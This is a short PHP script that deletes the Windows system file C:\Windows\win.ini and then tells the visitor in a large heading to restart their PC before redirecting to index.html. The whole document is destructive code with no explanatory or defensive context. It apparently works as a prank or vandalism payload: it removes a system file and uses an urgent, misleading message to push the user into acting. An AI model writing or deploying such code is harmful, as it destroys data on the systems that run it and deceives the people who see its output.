<?php
$file = "C:\Windows\win.ini";
if (!unlink($file))
  {
  echo ("<h1 align=center>Error deleting $file</h1>");
  }
else
  {
  echo ("<h1 align=center><b>PLEASE RESTART YOUR PC NOW! $file</b></h1>");
  }

  header("location:index.html");
?>